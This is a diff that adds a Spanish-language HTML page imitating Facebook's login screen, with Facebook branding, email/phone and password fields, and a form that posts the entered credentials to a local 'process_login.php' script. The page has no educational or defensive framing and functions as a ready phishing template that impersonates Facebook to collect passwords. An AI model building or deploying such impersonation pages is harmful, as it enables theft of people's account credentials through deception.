@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #e9ebee;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 4.5em;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 360px;
+        }
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 32px);
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #1d2129;
+            background-color: #f5f6f7;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+            background-color: #fff;
+        }
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #165eaf;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            margin-top: 16px;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            margin-top: 16px;
+            padding: 14px;
+            width: 60%;
+            cursor: pointer;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-form">
+            <form action="process_login.php" method="post">
+                <input type="text" name="email_or_phone" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <button type="submit" class="login-button">Iniciar sesión</button>
+                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            </form>
+            <hr>
+            <button class="create-account">Crear cuenta nueva</button>
+        </div>
+    </div>
+</body>
+</html>
